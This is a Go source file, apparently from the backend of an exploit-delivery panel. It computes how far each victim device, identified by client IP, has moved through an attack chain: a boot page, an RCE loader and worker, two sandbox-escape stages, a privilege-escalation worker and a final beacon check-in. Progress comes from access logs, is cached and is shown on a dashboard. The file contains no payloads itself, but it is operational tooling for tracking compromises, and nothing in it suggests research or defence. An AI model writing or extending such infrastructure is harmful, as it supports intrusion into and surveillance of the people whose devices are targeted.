package store

import (
	"sync"
	"time"
)

// 交付阶段进度权重（真机实测累计口径，总 = 100）。
//
// 用途：按设备（client IP）在交付链上到达的最远阶段，折算为进度百分比，
// 供看板进度条/设备列表展示。多实例安全：从共享 access_log 派生，任意 worker 一致。
//
//	boot   8   入口 boot.html
//	loader 18  B10/rce_loader.js
//	worker 46  B10/rce_worker_18.*.js
//	sbx0   58  /sbx0_main_18.4.js
//	sbx1   72  /sbx1_main.js
//	pe     86  /pe_worker.js
//	beacon 100 /beacon（live 巡回上线）
var StageCheckpoints = []struct {
	Name    string
	Match   string
	Percent int
}{
	{"boot", "/boot.html", 8},
	{"loader", "/rce_loader.js", 18},
	{"worker", "/rce_worker", 46},
	{"sbx0", "/sbx0_main", 58},
	{"sbx1", "/sbx1_main.js", 72},
	{"pe", "/pe_worker.js", 86},
	{"beacon", "/beacon", 100},
}

// StagePercentForPath 单条请求路径对应的阶段进度（未命中 = 0）。
func StagePercentForPath(path string) int {
	best := 0
	for _, s := range StageCheckpoints {
		if containsPath(path, s.Match) && s.Percent > best {
			best = s.Percent
		}
	}
	return best
}

// StageNameForPercent 进度值 → 阶段名（区间归属）。
func StageNameForPercent(pct int) string {
	name := "entry"
	for _, s := range StageCheckpoints {
		if pct >= s.Percent {
			name = s.Name
		}
	}
	return name
}

func containsPath(path, sub string) bool {
	if len(sub) == 0 || len(path) < len(sub) {
		return false
	}
	for i := 0; i+len(sub) <= len(path); i++ {
		if path[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// ClientStageProgress 每个 client（IP）到达的最远阶段百分比。
//
// 性能（INC-2026-0929-001 §6.1/§6.3）：该查询对 access_log 做全表 GROUP BY，
// 是设备列表聚合里最重的单条 SQL。ListDevices/看板/进度接口高频调用，
// 加 2s TTL 缓存把访问日志量级与查询频次解耦（秒级延迟对进度展示完全可接受）。
func ClientStageProgress() map[string]int {
	return progCache.get()
}

type progCacheT struct {
	mu     sync.RWMutex
	data   map[string]int
	expire time.Time
}

var progCache = &progCacheT{}

func (c *progCacheT) get() map[string]int {
	c.mu.RLock()
	if time.Now().Before(c.expire) {
		d := c.data
		c.mu.RUnlock()
		return d
	}
	c.mu.RUnlock()

	c.mu.Lock()
	defer c.mu.Unlock()
	if time.Now().Before(c.expire) { // double-check：等锁期间可能已被他人回源
		return c.data
	}
	c.data = clientStageProgressRaw()
	c.expire = time.Now().Add(2 * time.Second)
	return c.data
}

// clientStageProgressRaw 原始聚合查询（缓存未命中时执行）。
func clientStageProgressRaw() map[string]int {
	out := map[string]int{}
	db := GetDB()
	if db == nil {
		return out
	}
	rows := db.Query(`
        SELECT client, MAX(
          CASE
            WHEN path = '/beacon'                THEN 100
            WHEN path LIKE '%pe_worker.js'       THEN 86
            WHEN path LIKE '%sbx1_main.js'       THEN 72
            WHEN path LIKE '%sbx0_main%'         THEN 58
            WHEN path LIKE '%rce_worker%'        THEN 46
            WHEN path LIKE '%rce_loader.js'      THEN 18
            WHEN path LIKE '%boot.html'          THEN 8
            ELSE 0
          END) AS pct
        FROM access_log GROUP BY client`)
	for _, r := range rows {
		c := toStr(r["client"])
		if c != "" {
			out[c] = int(toInt(r["pct"]))
		}
	}
	return out
}

// StageCheckpointsJSON 阶段权重表（供前端渲染进度轴）。
func StageCheckpointsJSON() []map[string]any {
	out := make([]map[string]any, 0, len(StageCheckpoints))
	for _, s := range StageCheckpoints {
		out = append(out, map[string]any{"stage": s.Name, "percent": s.Percent})
	}
	return out
}

// StageProgressRows 进度明细（client / percent / stage），按进度降序。
func StageProgressRows() []map[string]any {
	prog := ClientStageProgress()
	rows := make([]map[string]any, 0, len(prog))
	for c, p := range prog {
		rows = append(rows, map[string]any{"client": c, "percent": p, "stage": StageNameForPercent(p)})
	}
	// 简单插入排序（量级小）
	for i := 1; i < len(rows); i++ {
		for j := i; j > 0 && toInt(rows[j]["percent"]) > toInt(rows[j-1]["percent"]); j-- {
			rows[j], rows[j-1] = rows[j-1], rows[j]
		}
	}
	return rows
}
